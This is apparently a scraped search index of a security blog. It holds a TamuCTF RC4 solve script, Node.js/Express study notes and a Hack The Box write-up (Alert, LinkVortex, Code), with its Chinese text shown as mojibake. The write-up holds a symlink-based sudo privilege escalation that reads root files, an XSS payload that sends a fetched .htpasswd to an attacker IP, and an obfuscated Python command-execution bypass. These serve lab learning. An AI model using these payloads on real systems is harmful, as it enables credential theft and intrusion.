list(range(256)) j = 0 for i in range(len(key)): j = (j + S[i] + key[i]) % 256 S[i], S[j] = S[j], S[i] return S def get_prefix(ind, known): while True: prefix = random.randbytes(256-32) key = prefix + known S = key_schedule(key) if (S[1] + S[S[1]])%256 == ind: return prefix def oracle(prefix): io.sendline(prefix.hex()) io.recvuntil(b'number is ') return int(io.recvline(keepends=False)) def Most_Common(lst): data = Counter(lst) return data.most_common(1)[0][0] key = b'a'*32 known_key = b'' #context.log_level = \"debug\" io = remote(\"tamuctf.com\", 443, ssl=True, sni=\"tamuctf_rc4-prefix\") #io = process(\"python3 ./RC4_prefix.py\", shell=True) for i in range(32): results = [] for _ in range(3): prefix = get_prefix(256-32 + i, known_key) leak = oracle(prefix) for j in range(256): S = key_schedule(prefix + known_key + bytes([j])) if S[(S[1] + S[S[1]])%256] == leak: results.append(j) known_key += bytes([Most_Common(results)]) print(known_key) print(known_key.hex()) io.sendline(known_key.hex()) io.interactive() ","date":"2025-03-31","objectID":"/tamuctf2025/:2:4","tags":["crypto"],"title":"Tamuctf2025","uri":"/tamuctf2025/"},{"categories":["CTF"],"content":"æ€»ç»“ è‡ªå·±å¥½èœå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Šå•Š ","date":"2025-03-31","objectID":"/tamuctf2025/:3:0","tags":["crypto"],"title":"Tamuctf2025","uri":"/tamuctf2025/"},{"categories":["nodejs"],"content":"ä¸ºä»€ä¹ˆå­¦nodejs å¯èƒ½æ˜¯åé¢è¦æ¥æ‰‹ä¸€äº›é¡¹ç›®ï¼Œæˆ–è€…æ˜¯äº›javaspringçƒ¦äº†ï¼Œå­¦å­¦nodejsç©ï¼Œç›®å‰æ„Ÿè§‰nodejsçš„ç”Ÿæ€è¿˜æ˜¯ä¸é”™çš„ ","date":"2025-03-31","objectID":"/study_nodejs1/:1:0","tags":["å¼€å‘","study"],"title":"Study Nodejsã€Œ1ã€","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"npmçš„ç”Ÿå‘½å‘¨æœŸ ç¬¬ä¸€å¼€å§‹ä¹Ÿæ²¡æƒ³åˆ°è¿™ä¸ªè¿˜æœ‰ç”Ÿå‘½å‘¨æœŸçš„ï¼Œå°±è®°å½•ä¸€ä¸‹ \"predev\": \"node prev.js\", \"dev\": \"node index.js\", \"postdev\": \"node post.js\" æ‰§è¡Œ npm run dev å‘½ä»¤çš„æ—¶å€™ predev ä¼šè‡ªåŠ¨æ‰§è¡Œ ä»–çš„ç”Ÿå‘½å‘¨æœŸæ˜¯åœ¨devä¹‹å‰æ‰§è¡Œï¼Œç„¶åæ‰§è¡Œdevå‘½ä»¤ï¼Œå†ç„¶åæ‰§è¡Œpostdevï¼Œä¹Ÿå°±æ˜¯devä¹‹åæ‰§è¡Œ è¿ç”¨åœºæ™¯ä¾‹å¦‚npm run build å¯ä»¥åœ¨æ‰“åŒ…ä¹‹ååˆ é™¤distç›®å½•ç­‰ç­‰ postä¾‹å¦‚ä½ ç¼–å†™å®Œä¸€ä¸ªå·¥å…·å‘å¸ƒnpmï¼Œé‚£å°±å¯ä»¥åœ¨ä¹‹åå†™ä¸€ä¸ªciè„šæœ¬é¡ºä¾¿å¸®ä½ æ¨é€åˆ°gitç­‰ç­‰ ","date":"2025-03-31","objectID":"/study_nodejs1/:2:0","tags":["å¼€å‘","study"],"title":"Study Nodejsã€Œ1ã€","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"npx ä¸ªäººç†è§£npxçš„ä½œç”¨æ˜¯åœ¨å‘½ä»¤è¡Œä¸­è¿è¡ŒnodeåŒ…ä¸­çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè€Œä¸éœ€è¦å…¨å±€å®‰è£…è¿™äº›åŒ…ã€‚å“ï¼Œè¿™æ ·å°±ä¸ä¼šå…¨å±€åŒ…ä¹±é£å’ŒåŒ…ç‰ˆæœ¬å†²çªäº†ï¼Œå°±è¡Œpythonçš„è™šæ‹Ÿç¯å¢ƒéš”ç¦»ä¸€æ ·ï¼Œä½†æ˜¯åˆæ„Ÿè§‰å’Œpipxæœ‰å¼‚æ›²åŒå·¥ä¹‹å¦™ï¼Ÿ ","date":"2025-03-31","objectID":"/study_nodejs1/:3:0","tags":["å¼€å‘","study"],"title":"Study Nodejsã€Œ1ã€","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"express ç›®å‰ä½“éªŒæ˜¯å¾ˆçˆ½çš„ï¼ŒæŠŠåŸç”Ÿnodejsçš„httpæœåŠ¡å°è£…äº†ï¼Œæ–¹ä¾¿ä½¿ç”¨ (ä¸‹é¢ä»£ç çš„é£æ ¼éƒ½æ˜¯module) ","date":"2025-03-31","objectID":"/study_nodejs1/:4:0","tags":["å¼€å‘","study"],"title":"Study Nodejsã€Œ1ã€","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"åŸºæœ¬ä½¿ç”¨æ–¹æ³• httpæœåŠ¡ æ¯”è¾ƒå¥½ç©çš„åœ°æ–¹åœ¨äºexpressæ˜¯ä¸€ä¸ªå‡½æ•°ï¼ŒåŒæ—¶ç›‘å¬ç«¯å£çš„æ—¶å€™ä¹Ÿä¸ç”¨åƒåŸç”Ÿçš„ä¸€æ ·äº† //åŸç”Ÿ const http = require('http'); const url = require('url'); const fs = require('fs'); http.createServer((req, res) =\u003e { }).listen(3000,()=\u003e{ }); import express from 'express'; const app = express() app.listen(3000, () =\u003e console.log('Listening on port 3000')) æ¥å£ç¼–å†™ ç¼–å†™get post æ¥å£ app.get('/', (req, res) =\u003e { res.send('get') }) app.post('/create', (req, res) =\u003e { res.send('post') }) æ¥å—å‰ç«¯çš„å‚æ•° ä»–æ˜¯æ— æ³•ç›´æ¥æ¥æ‰‹jsonå‚æ•°çš„ï¼Œæ‰€ä»¥è¦ç”¨ä¸­é—´ä»¶ app.use(express.json()) app.get('/', (req, res) =\u003e { console.log(req.query) //get ç”¨query res.send('get') }) app.post('/create', (req, res) =\u003e { console.log(req.body) //postç”¨body res.send('post') }) //å¦‚æœæ˜¯åŠ¨æ€å‚æ•°ç”¨ params app.get('/:id', (req, res) =\u003e { console.log(req.params) res.send('get id') }) ","date":"2025-03-31","objectID":"/study_nodejs1/:4:1","tags":["å¼€å‘","study"],"title":"Study Nodejsã€Œ1ã€","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"æ¨¡å—åŒ– å…¨éƒ¨ä¸œè¥¿å†™ä¾æ‰˜å¾ˆéš¾çœ‹å’Œç»´æŠ¤ï¼Œexpresså…è®¸å°†è·¯ç”±å¤„ç†ç¨‹åºæ‹†åˆ†ä¸ºå¤šä¸ªæ¨¡å—ï¼Œæ¯ä¸ªæ¨¡å—è´Ÿè´£å¤„ç†ç‰¹å®šçš„è·¯ç”±ã€‚é€šè¿‡å°†è·¯ç”±å¤„ç†ç¨‹åºæ‹†åˆ†ä¸ºæ¨¡å—ï¼Œå¯ä»¥ä½¿ä»£ç é€»è¾‘æ›´æ¸…æ™°ï¼Œæ˜“äºç»´æŠ¤å’Œæ‰©å±• ä¾‹å¦‚æ–‡ä»¶ç»“æ„ src --user.js --list.js app.js src/user.js import express from 'express'; const router = express.Router(); router.post('/login', (req, res) =\u003e { res.json({ code: 200, msg: 'ç™»å½•æˆåŠŸ' }) }); router.post('/register', (req, res) =\u003e { res.json({ code: 200, msg: 'æ³¨å†ŒæˆåŠŸ' }) }); export default router; src/list.js import express from 'express'; const router = express.Router(); router.get('/getall', (req, res) =\u003e { res.json({ code: 200, msg: 'è·å–æˆåŠŸ', data: [{ id: 1 }] }) }); export default router; app.js import express from 'express'; import User from './src/user.js' const app = express() app.use(express.json()) app.use('/user', User) app.get('/', (req, res) =\u003e { console.log(req.query) res.send('get') }) app.get('/:id', (req, res) =\u003e { console.log(req.params) res.send('get id') }) app.post('/create', (req, res) =\u003e { console.log(req.body) res.send('post') }) app.listen(3000, () =\u003e console.log('Listening on port 3000')) ","date":"2025-03-31","objectID":"/study_nodejs1/:4:2","tags":["å¼€å‘","study"],"title":"Study Nodejsã€Œ1ã€","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"ä¸­é—´ä»¶ ä¸­é—´ä»¶æ˜¯ä¸€ä¸ªå…³é”®æ¦‚å¿µã€‚ä¸­é—´ä»¶æ˜¯å¤„ç†HTTPè¯·æ±‚å’Œå“åº”çš„å‡½æ•°ï¼Œå®ƒä½äºè¯·æ±‚å’Œæœ€ç»ˆè·¯ç”±å¤„ç†å‡½æ•°ä¹‹é—´ï¼Œå¯ä»¥å¯¹è¯·æ±‚å’Œå“åº”è¿›è¡Œä¿®æ”¹ã€æ‰§è¡Œé¢å¤–çš„é€»è¾‘æˆ–è€…æ‰§è¡Œå…¶ä»–ä»»åŠ¡ã€‚ ä¸­é—´ä»¶å‡½æ•°æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼šreqï¼ˆè¯·æ±‚å¯¹è±¡ï¼‰ã€resï¼ˆå“åº”å¯¹è±¡ï¼‰å’Œnextï¼ˆä¸‹ä¸€ä¸ªä¸­é—´ä»¶å‡½æ•°ï¼‰ã€‚é€šè¿‡è°ƒç”¨next()æ–¹æ³•ï¼Œä¸­é—´ä»¶å¯ä»¥å°†æ§åˆ¶æƒä¼ é€’ç»™ä¸‹ä¸€ä¸ªä¸­é—´ä»¶å‡½æ•°ã€‚å¦‚æœä¸­é—´ä»¶ä¸è°ƒç”¨next()æ–¹æ³•ï¼Œè¯·æ±‚å°†è¢«ä¸­æ­¢ï¼Œä¸ä¼šç»§ç»­ä¼ é€’ç»™ä¸‹ä¸€ä¸ªä¸­é—´ä»¶æˆ–è·¯ç”±å¤„ç†å‡½æ•° æ‹¿log4jsä¸¾ä¾‹å­ middleware/logger.js import log4js from 'log4js'; // é…ç½® log4js log4js.configure({ appenders: { out: { type: 'stdout', // è¾“å‡ºåˆ°æ§åˆ¶å° layout: { type: 'colored' // ä½¿ç”¨å¸¦é¢œè‰²çš„å¸ƒå±€ } }, file: { type: 'file', // è¾“å‡ºåˆ°æ–‡ä»¶ filename: './logs/server.log', // æŒ‡å®šæ—¥å¿—æ–‡ä»¶è·¯å¾„å’Œåç§° } }, categories: { default: { appenders: ['out', 'file'], // ä½¿ç”¨ out å’Œ file è¾“å‡ºå™¨ level: 'debug' // è®¾ç½®æ—¥å¿—çº§åˆ«ä¸º debug } } }); // è·å– logger const logger = log4js.getLogger('default'); // æ—¥å¿—ä¸­é—´ä»¶ const loggerMiddleware = (req, res, next) =\u003e { logger.debug(`${req.method} ${req.url}`); // è®°å½•è¯·æ±‚æ–¹æ³•å’ŒURL next(); }; export default loggerMiddleware; app.js import express from 'express'; import User from './src/user.js' import loggerMiddleware from './middleware/logger.js'; const app = express() app.use(loggerMiddleware) ","date":"2025-03-31","objectID":"/study_nodejs1/:4:3","tags":["å¼€å‘","study"],"title":"Study Nodejsã€Œ1ã€","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"é˜²ç›—é“¾ é˜²ç›—é“¾ä¸€èˆ¬ä¸»è¦å°±æ˜¯éªŒè¯host æˆ–è€… refererï¼Œæ‰‹åŠ¨æ·»åŠ ä¸€ä¸ªç™½åå• import express from 'express'; const app = express(); const whiteList = ['localhost'] const preventHotLingking = (req, res, next) =\u003e { const referer = req.get('referer') if (referer) { const { hostname } = new URL(referer) if (!whiteList.includes(hostname)) { res.status(403).send('403 Forbidden') return } } console.log(referer) next(); } app.use(express.static('static')) app.listen(3000, () =\u003e { console.log('Server is running on port 3000'); }); ","date":"2025-03-31","objectID":"/study_nodejs1/:4:4","tags":["å¼€å‘","study"],"title":"Study Nodejsã€Œ1ã€","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"è·¨åŸŸé—®é¢˜ è·¨åŸŸèµ„æºå…±äº«ï¼ˆCross-Origin Resource Sharingï¼ŒCORSï¼‰æ˜¯ä¸€ç§æœºåˆ¶ï¼Œç”¨äºåœ¨æµè§ˆå™¨ä¸­å®ç°è·¨åŸŸè¯·æ±‚è®¿é—®èµ„æºçš„æƒé™æ§åˆ¶ã€‚å½“ä¸€ä¸ªç½‘é¡µé€šè¿‡ XMLHttpRequest æˆ– Fetch API å‘èµ·è·¨åŸŸè¯·æ±‚æ—¶ï¼Œæµè§ˆå™¨ä¼šæ ¹æ®åŒæºç­–ç•¥ï¼ˆSame-Origin Policyï¼‰è¿›è¡Œé™åˆ¶ã€‚åŒæºç­–ç•¥è¦æ±‚è¯·æ±‚çš„æºï¼ˆåè®®ã€åŸŸåå’Œç«¯å£ï¼‰å¿…é¡»ä¸èµ„æºçš„æºç›¸åŒï¼Œå¦åˆ™è¯·æ±‚ä¼šè¢«æµè§ˆå™¨æ‹’ç»ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨åšå‰åç«¯åˆ†ç¦»çš„é¡¹ç›®çš„æ—¶å€™ç™¾åˆ†ç™¾é‡åˆ° ","date":"2025-03-31","objectID":"/study_nodejs1/:5:0","tags":["å¼€å‘","study"],"title":"Study Nodejsã€Œ1ã€","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"ä¸€èˆ¬è§£å†³æ–¹æ³• ä¸¾ä¸ªå°ä¾‹å­ å‘é€è¯·æ±‚ fetch('http://localhost:3000/info').then(res=\u003e{ return res.json() }).then(res=\u003e{ console.log(res) }) å†™ä¸ªæ™®é€šçš„getæ¥å£ import express from 'express' const app = express() app.get('/info', (req, res) =\u003e { res.json({ code: 200 }) }) app.listen(3000, () =\u003e { console.log('http://localhost:3000') }) è¿™ä¸ªæ—¶å€™å°±ä¼šæŠ¥é”™ï¼Œå› ä¸ºè·¨åŸŸäº†ï¼Œè§£å†³æ–¹æ³•å°±æ˜¯è®¾ç½®å“åº”å¤´(æˆ‘è¿™é‡Œæ˜¯5500ç«¯å£) app.use('*',(req,res,next)=\u003e{ res.setHeader('Access-Control-Allow-Origin','http://localhost:5500') next() }) ","date":"2025-03-31","objectID":"/study_nodejs1/:5:1","tags":["å¼€å‘","study"],"title":"Study Nodejsã€Œ1ã€","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"è¯·æ±‚å¤´ Acceptï¼šæŒ‡å®šå®¢æˆ·ç«¯èƒ½å¤Ÿå¤„ç†çš„å†…å®¹ç±»å‹ã€‚ Accept-Languageï¼šæŒ‡å®šå®¢æˆ·ç«¯åå¥½çš„è‡ªç„¶è¯­è¨€ã€‚ Content-Languageï¼šæŒ‡å®šè¯·æ±‚æˆ–å“åº”å®ä½“çš„è‡ªç„¶è¯­è¨€ã€‚ Content-Typeï¼šæŒ‡å®šè¯·æ±‚æˆ–å“åº”å®ä½“çš„åª’ä½“ç±»å‹ã€‚ DNT (Do Not Track)ï¼šæŒ‡ç¤ºå®¢æˆ·ç«¯ä¸å¸Œæœ›è¢«è·Ÿè¸ªã€‚ Originï¼šæŒ‡ç¤ºè¯·æ±‚çš„æºï¼ˆåè®®ã€åŸŸåå’Œç«¯å£ï¼‰ã€‚ User-Agentï¼šåŒ…å«å‘èµ·è¯·æ±‚çš„ç”¨æˆ·ä»£ç†çš„ä¿¡æ¯ã€‚ Refererï¼šæŒ‡ç¤ºå½“å‰è¯·æ±‚çš„æº URLã€‚ Content-type: application/x-www-form-urlencoded | multipart/form-data | text/plain é‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ”¯æŒçš„æ—¶å€™å°±å†™ â€˜Access-Control-Allow-Headersâ€™,â€˜Content-Typeâ€™ ","date":"2025-03-31","objectID":"/study_nodejs1/:5:2","tags":["å¼€å‘","study"],"title":"Study Nodejsã€Œ1ã€","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"è¯·æ±‚æ–¹æ³•æ”¯æŒ é»˜è®¤æƒ…å†µä¸‹ï¼ŒCORS ä»…å…è®¸ GETã€POSTã€HEADå’ŒOPTIONS æ–¹æ³•ã€‚å¦‚æœéœ€è¦æ”¯æŒå…¶ä»–æ–¹æ³•ï¼Œéœ€è¦è®¾ç½® Access-Control-Allow-Methods å¤´ã€‚ æ¯”å¦‚éœ€è¦æ”¯æŒpatch â€˜Access-Control-Allow-Methodsâ€™,â€˜POST,GET,OPTIONS,DELETE,PATCHâ€™ ","date":"2025-03-31","objectID":"/study_nodejs1/:5:3","tags":["å¼€å‘","study"],"title":"Study Nodejsã€Œ1ã€","uri":"/study_nodejs1/"},{"categories":["nodejs"],"content":"è‡ªå®šä¹‰å“åº”å¤´ è‡ªå®šä¹‰å“åº”å¤´æ˜¯æŒ‡åœ¨å“åº”ä¸­æ·»åŠ è‡ªå®šä¹‰çš„ HTTP å¤´ã€‚è‡ªå®šä¹‰å“åº”å¤´å¯ä»¥ç”¨äºä¼ é€’é¢å¤–çš„ä¿¡æ¯ï¼Œä¾‹å¦‚è‡ªå®šä¹‰çš„é”™è¯¯ç ã€è‡ªå®šä¹‰çš„å“åº”æ¶ˆæ¯ç­‰ã€‚ app.get('/info', (req, res) =\u003e { res.set('zsm', '1') res.json({ code: 200 }) }) é‚£ä¹ˆå‰ç«¯æ¥æ”¶çš„æ–¹æ³•ä¹Ÿå¾ˆç®€å• fetch('http://localhost:3000/info').then(res=\u003e{ const headers = res.headers console.log(headers.get('zsm')) return res.json() }).then(res=\u003e{ console.log(res) }) æˆ‘ä»¬åªéœ€è¦å»æ¥æ”¶è¯»å–å°±è¡Œäº†ï¼Œä½†æ˜¯å‘ç°æ˜¯null è¿™æ˜¯å› ä¸ºåç«¯æ²¡æœ‰æŠ›å‡ºè¯¥å“åº”å¤´æ‰€ä»¥åç«¯éœ€è¦å¢åŠ æŠ›å‡ºçš„ä¸€ä¸ªå­—æ®µ app.get('/info', (req, res) =\u003e { res.set('zsm', '1') res.setHeader('Access-Control-Expose-Headers', 'zsm') res.json({ code: 200 }) }) ","date":"2025-03-31","objectID":"/study_nodejs1/:5:4","tags":["å¼€å‘","study"],"title":"Study Nodejsã€Œ1ã€","uri":"/study_nodejs1/"},{"categories":["é¶åœº"],"content":"é¶åœºé“¾æ¥ https://app.hackthebox.com/machines/Alert https://app.hackthebox.com/machines/LinkVortex codeæ˜¯æœ¬å‘¨é¶æœºå“ ","date":"2025-03-24","objectID":"/htb-alert_and_linkvortex_and_code/:1:0","tags":["æ¸—é€"],"title":"HTB Alert\u0026LinkVortex\u0026code","uri":"/htb-alert_and_linkvortex_and_code/"},{"categories":["é¶åœº"],"content":"ç¬”è®° HTBçš„é¶åœºè´¨é‡éƒ½å¾ˆé«˜ï¼Œä¸æƒ³åƒå…¶ä»–çš„ä¸€æ ·å†™å¾ˆå¤šæ²¡ç”¨çš„ä¸œè¥¿ï¼Œä¸»è¦å†™å­¦åˆ°çš„ä¸œè¥¿å’Œé¶æœºæ¦‚å†µ ","date":"2025-03-24","objectID":"/htb-alert_and_linkvortex_and_code/:2:0","tags":["æ¸—é€"],"title":"HTB Alert\u0026LinkVortex\u0026code","uri":"/htb-alert_and_linkvortex_and_code/"},{"categories":["é¶åœº"],"content":"whatweb å¯ä»¥è‡ªåŠ¨åˆ†æç½‘ç«™çš„å“åº”å¹¶è¯†åˆ«å‡ºä½¿ç”¨çš„Webæ¡†æ¶ã€CMSã€æœåŠ¡å™¨ã€JavaScriptåº“ç­‰æŠ€æœ¯ç»„ä»¶ï¼Œ ä¸€èˆ¬æƒ…å†µä¸‹whatweb -vè¾“å‡ºçš„æ¯”è¾ƒè¯¦ç»†ï¼Œè€Œä¸”å¥½çœ‹ï¼Œ WhatWeb æœ‰ 4 ç§æ‰«æçº§åˆ«ï¼Œé€šè¿‡æ•°å­— 1~4 é€‰æ‹©ï¼Œé»˜è®¤ä¸º1ï¼š stealthy æ¯ä¸ªç›®æ ‡å‘é€ä¸€æ¬¡httpè¯·æ±‚ï¼Œå¹¶ä¸”ä¼šè·Ÿéšé‡å®šå‘ unused ä¸å¯ç”¨ï¼ˆä»2011å¹´å¼€å§‹ï¼Œæ­¤å‚æ•°å°±æ˜¯åœ¨å¼€å‘çŠ¶æ€ï¼‰ aggressive æ¯ä¸ªç›®æ ‡å‘é€å°‘é‡çš„httpè¯·æ±‚ï¼Œè¿™äº›è¯·æ±‚æ—¶æ ¹æ®å‚æ•°ä¸º1æ—¶ç»“æœç¡®å®šçš„ heavy æ¯ä¸ªç›®æ ‡ä¼šå‘é€å¤§é‡çš„httpè¯·æ±‚ï¼Œä¼šå»å°è¯•æ¯ä¸€ä¸ªæ’ä»¶ whatweb -v -a ç­‰çº§ åŸŸåã€‚ ","date":"2025-03-24","objectID":"/htb-alert_and_linkvortex_and_code/:2:1","tags":["æ¸—é€"],"title":"HTB Alert\u0026LinkVortex\u0026code","uri":"/htb-alert_and_linkvortex_and_code/"},{"categories":["é¶åœº"],"content":"git-dumper ç±»ä¼¼githackï¼Œéƒ½å¯ä»¥ç”¨ ","date":"2025-03-24","objectID":"/htb-alert_and_linkvortex_and_code/:2:2","tags":["æ¸—é€"],"title":"HTB Alert\u0026LinkVortex\u0026code","uri":"/htb-alert_and_linkvortex_and_code/"},{"categories":["é¶åœº"],"content":"LinkVortexææƒ bob@linkvortex:~$ sudo -l Matching Defaults entries for bob on linkvortex: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT User bob may run the following commands on linkvortex: (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png çœ‹çœ‹è¿™ä¸ª.shæ–‡ä»¶æ˜¯ä»€ä¹ˆ bob@linkvortex:~$ cat /opt/ghost/clean_symlink.sh #!/bin/bash QUAR_DIR=\"/var/quarantined\" if [ -z $CHECK_CONTENT ];then CHECK_CONTENT=false fi LINK=$1 if ! [[ \"$LINK\" =~ \\.png$ ]]; then /usr/bin/echo \"! First argument must be a png file !\" exit 2 fi if /usr/bin/sudo /usr/bin/test -L $LINK;then LINK_NAME=$(/usr/bin/basename $LINK) LINK_TARGET=$(/usr/bin/readlink $LINK) if /usr/bin/echo \"$LINK_TARGET\" | /usr/bin/grep -Eq '(etc|root)';then /usr/bin/echo \"! Trying to read critical files, removing link [ $LINK ] !\" /usr/bin/unlink $LINK else /usr/bin/echo \"Link found [ $LINK ] , moving it to quarantine\" /usr/bin/mv $LINK $QUAR_DIR/ if $CHECK_CONTENT;then /usr/bin/echo \"Content:\" /usr/bin/cat $QUAR_DIR/$LINK_NAME 2\u003e/dev/null fi fi fi è„šæœ¬è®¾è®¡ç”¨äºæ£€æŸ¥ä¸€ä¸ªæ–‡ä»¶ï¼ˆä½œä¸ºå‚æ•°ä¼ é€’ï¼‰æ˜¯å¦æ˜¯ä¸€ä¸ªæŒ‡å‘ PNG æ–‡ä»¶çš„ç¬¦å·é“¾æ¥ã€‚å¦‚æœæ˜¯ï¼Œå®ƒä¼šæ£€æŸ¥ç¬¦å·é“¾æ¥çš„ç›®æ ‡ï¼Œå¹¶å†³å®šæ˜¯åˆ é™¤å®ƒè¿˜æ˜¯å°†å…¶éš”ç¦»ã€‚å…·ä½“æ¥è¯´ï¼Œå¦‚æœç¬¦å·é“¾æ¥æŒ‡å‘æ•æ„Ÿæ–‡ä»¶æˆ–ç›®å½•ï¼ˆå¦‚ /etc æˆ– /root ï¼‰ï¼Œåˆ™ä¼šåˆ é™¤é“¾æ¥ã€‚å¦åˆ™ï¼Œå®ƒå°†åœ¨æŒ‡å®šçš„ç›®å½•ï¼ˆ/var/quarantinedï¼‰ä¸­éš”ç¦»é“¾æ¥ã€‚å¦‚æœå°† CHECK_CONTENT å˜é‡è®¾ç½®ä¸º true ï¼Œå®ƒè¿˜å¯èƒ½æ‰“å°éš”ç¦»æ–‡ä»¶çš„å…§å®¹ã€‚ é¦–å…ˆæˆ‘ä»¬çš„æ€è·¯å°±æ˜¯è¯»å–rootçš„flagï¼Œæˆ‘ä»¬å¯ä»¥æŠŠè¿™ä¸ª.txté“¾æ¥åˆ°.pngä¸Šï¼Œä½†æ˜¯ç›´æ¥é“¾æ¥ä¼šæŠ¥é”™ï¼Œæˆ‘ä»¬åœ¨ä¸­é—´å†è½¬æŠ˜ä¸€ä¸‹ bob@linkvortex:~$ export CHECK_CONTENT=true bob@linkvortex:~$ touch link1.png bob@linkvortex:~$ `ln -sf /root/root.txt link1.png` bob@linkvortex:~$ touch link2.png bob@linkvortex:~$ `ln -sf /home/bob/link1.png link2.png` bob@linkvortex:~$ ls link1.png link2.png user.txt bob@linkvortex:~$ sudo bash /opt/ghost/clean_symlink.sh link2.png Link found [ link2.png ] , moving it to quarantine Content: a2340eed30a7a15b1fb810a7945d2338 å®é™…ä¸Šè¿™ä¸ªå°±æ˜¯ä¸ªä»»æ„æ–‡ä»¶è¯»å–ï¼Œæˆ‘ä»¬å½“ç„¶å¯ä»¥å»è¯»å–sshçš„å¯†é’¥å»åšåˆ°ææƒçš„æ•ˆæœ ","date":"2025-03-24","objectID":"/htb-alert_and_linkvortex_and_code/:2:3","tags":["æ¸—é€"],"title":"HTB Alert\u0026LinkVortex\u0026code","uri":"/htb-alert_and_linkvortex_and_code/"},{"categories":["é¶åœº"],"content":"XSSå¤–å¸¦æ–‡ä»¶ å†™è¿™ä¸ªå°±æƒ³èµ·äº†ccbçº¿ä¸‹èµ›çš„XSSå¤–å¸¦cookieï¼Œè™½ç„¶ä¸æ˜¯webæ‰‹ï¼Œä½†æ˜¯æƒ³èµ·æ¥è¿™ä¸ªæ²¡åšå‡ºæ¥å°±å¾ˆéš¾å—ï¼Œå®³ çœ‹çœ‹ç½‘é¡µæºä»£ç  \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003clink rel=\"stylesheet\" href=\"css/style.css\"\u003e \u003ctitle\u003eAlert - Markdown Viewer\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cnav\u003e \u003ca href=\"index.php?page=alert\"\u003eMarkdown Viewer\u003c/a\u003e \u003ca href=\"index.php?page=contact\"\u003eContact Us\u003c/a\u003e \u003ca href=\"index.php?page=about\"\u003eAbout Us\u003c/a\u003e \u003ca href=\"index.php?page=donate\"\u003eDonate\u003c/a\u003e \u003c/nav\u003e \u003cdiv class=\"container\"\u003e \u003ch1\u003eMarkdown Viewer\u003c/h1\u003e\u003cdiv class=\"form-container\"\u003e \u003cform action=\"visualizer.php\" method=\"post\" enctype=\"multipart/form-data\"\u003e \u003cinput type=\"file\" name=\"file\" accept=\".md\" required\u003e \u003cinput type=\"submit\" value=\"View Markdown\"\u003e \u003c/form\u003e \u003c/div\u003e \u003c/div\u003e \u003cfooter\u003e \u003cp style=\"color: black;\"\u003eÂ© 2024 Alert. All rights reserved.\u003c/p\u003e \u003c/footer\u003e \u003c/body\u003e \u003c/html\u003e å‘ç°mdæ–‡ä»¶å†™çš„ä¸œè¥¿éƒ½ä¼šåœ¨è¿™é‡Œæ˜¾ç°ï¼Œå…¸å‹çš„XSSæ¼æ´. çªç„¶æƒ³èµ·æ¥æœåŠ¡æ˜¯Apacheï¼Œé‚£ä¹ˆå°±æœ‰.htpasswdç”¨æ¥å­˜æ”¾å¯†ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„æ€è·¯å°±æ˜¯å»å¤–å¸¦è¿™ä¸ªæ–‡ä»¶ï¼Œå»å¾—åˆ°è´¦å·çš„å¯†ç ï¼Œä¼Ÿå¤§çš„grok3ä¼šç»™æˆ‘payloadçš„ æœ¬åœ°å…ˆå¼€pythonçš„httpæœåŠ¡(ccbçš„é‚£ä¸ªäº”åˆ†é’Ÿåˆ·æ–°ä¸€æ¬¡ä¸åº”è¯¥å…³çš„å•Šå•Šå•Š) \u003cscript\u003e fetch(\"http://alert.htb/messages.php?file=../../../../../../../var/www/statistics.alert.htb/.htpasswd\") .then(response =\u003e response.text()) .then(data =\u003e { fetch(\"http://10.10.16.5:80/?file_content=\" + encodeURIComponent(data)); }); \u003c/script\u003e è¿æ¥è¾“å…¥åˆ°Contact Usï¼Œæœ¬åœ°æ¥æ”¶åˆ°%3Cpre%3Ealbert%3A%24apr1%24bMoRBJOg%24igG8WBtQ1xYDTQdLjSWZQ%2F%0A%3C%2Fpre%3E%0A ï¼Œåé¢çˆ†ç ´å°±è¡Œäº† ","date":"2025-03-24","objectID":"/htb-alert_and_linkvortex_and_code/:2:4","tags":["æ¸—é€"],"title":"HTB Alert\u0026LinkVortex\u0026code","uri":"/htb-alert_and_linkvortex_and_code/"},{"categories":["é¶åœº"],"content":"ç«¯å£è½¬å‘ å‡è®¾sshè¿›å…¥ä¸€ä¸ªé¶æœºï¼Œpså‘ç°è¿˜æœ‰ç«¯å£åœ¨è¿è¡Œï¼Œä½†æ˜¯nmapå¹¶æ²¡æœ‰å‘ç°ï¼Œå°±å¯ä»¥å°è¯•æŠŠç«¯å£è½¬å‘å‡ºå»ï¼Œä¾‹å¦‚ ssh -L 8080:127.0.0.1:8080 albert@alert.htbï¼Œä¸€èˆ¬æ¼æ´ç‚¹åœ¨è¿™ä¸ªwebé‡Œé¢ ","date":"2025-03-24","objectID":"/htb-alert_and_linkvortex_and_code/:2:5","tags":["æ¸—é€"],"title":"HTB Alert\u0026LinkVortex\u0026code","uri":"/htb-alert_and_linkvortex_and_code/"},{"categories":["é¶åœº"],"content":"codeçš„æ¨¡æ‹Ÿè¾“å‡º modules = globals().values() global _module for name, module in sys.modules.items(): if name == ('o'+'s'): _module = module break _method = getattr(_module, 'po' + 'pen') file_obj = _method(' ') _method = getattr(file_obj, 're' + 'ad') output = _method() print(output) å…¶å®æœ¬è´¨æ˜¯ import os output = os.popen(' ').read() print(output) 